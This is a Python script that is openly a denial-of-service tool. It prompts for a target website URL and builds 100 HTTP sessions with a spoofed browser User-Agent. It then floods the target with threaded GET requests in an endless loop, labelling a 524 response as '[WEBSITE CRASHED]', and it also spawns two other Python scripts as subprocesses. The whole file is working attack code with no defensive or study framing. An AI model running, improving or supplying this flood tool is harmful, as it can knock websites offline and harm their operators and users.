import requests
import threading
import subprocess

target_website = input("Enter target website URL: ")

def run_script(script_name):
    subprocess.Popen(["python", script_name])

if __name__ == "__main__":
    run_script("main.py")
    run_script("main2.py")

def create_bots():
    bots = []
    for i in range(100):
        bot = requests.Session()
        bot.headers.update({"User-Agent": "Mozilla/5.0"})
        bots.append(bot)
    return bots

def send_request(bot):
    try:
        response = bot.get(target_website)
        if response.status_code == 200:
            print(f"Bot attacking {target_website}. Response status code: \x1b[32m{response.status_code}\x1b[0m")  # Green color for success
        elif response.status_code == 524:
          print(f"[WEBSITE CRASHED] Bot attacking {target_website}. Response status code: \x1b[31;2m{response.status_code}\x1b[0m")
        else:
            print(f"Bot attacking {target_website}. Response status code: \x1b[31m{response.status_code}\x1b[0m")  # Red color for failure
    except:
        print("Error during bot attack")

def ddos_attack():
    bots = create_bots()
    while True:
        threads = []
        for bot in bots:
            t = threading.Thread(target=send_request, args=(bot,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()

ddos_attack()
